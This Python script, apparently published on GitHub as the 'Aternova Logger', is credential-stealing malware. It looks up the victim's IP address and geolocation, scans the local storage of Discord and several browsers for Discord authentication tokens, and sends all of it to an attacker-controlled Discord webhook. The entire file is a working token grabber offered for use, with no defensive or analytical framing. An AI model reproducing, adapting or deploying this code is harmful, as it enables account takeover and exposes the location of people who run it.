import os
import requests
import json
import re
from dhooks import Webhook, Embed
from datetime import datetime

#Credits: coded by haribv, This is the Aternova Logger! Please leave a Star on Github!!!
#updated!!

# WEBHOOK
hook = Webhook("WEBHOOK")

ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'https://geo.ipify.org/api/v2/country?apiKey=at_R8PCEHjzhgL8DHOnRamh4mJsjq5aj&ipAddress={ip}')
geo = r.json()

list_name = "" 
#COLOR
embed = Embed(title=list_name, color=0x9a5fed)

#SET A PICTURE
image_url = "https://cdn.discordapp.com/attachments/1317177461884063765/1317183108335796224/Iconarchive-Incognito-Animal-2-Cat-Cool.1024_1.png?ex=675dc1dd&is=675c705d&hm=ad9e31310f0e2145ff1513109783a6481f475c199570bdee550bd2ae2a331681&"
embed.set_thumbnail(url=image_url)

# INVISIBLE IP
embed.add_field(name='IP', value='||' + geo['ip'] + '||', inline=True)

# IPS LOCS
fields = [
    {'name': 'Country', 'value': geo['location']['country']},
    {'name': 'Region', 'value': geo['location'].get('region')},
    {'name': 'Timezone', 'value': geo['location'].get('timezone')},
    {'name': 'Route',   'value': geo['as'].get('route')},
    {'name': 'Domain Name',   'value': geo['as'].get('name')},
    {'name': 'Domain Details',   'value': geo['as'].get('domain')},
    {'name': 'ASN',   'value': geo['as'].get('asn')}
]

for field in fields:
    embed.add_field(name=field['name'], value=field['value'], inline=False)

# FIND TOKEN
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

# RUN MAIN
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                embed.add_field(name='Token', value='||' + token + '||', inline=True)
                embed.add_field(name='Platform', value=f'Token found in {platform}', inline=True)
                break
        else:
            embed.add_field(name='Token', value='No tokens found.', inline=True)
        embed.add_field(name='\u200b', value='\u200b', inline=True)
    message = hook.send(embed=embed)
main()
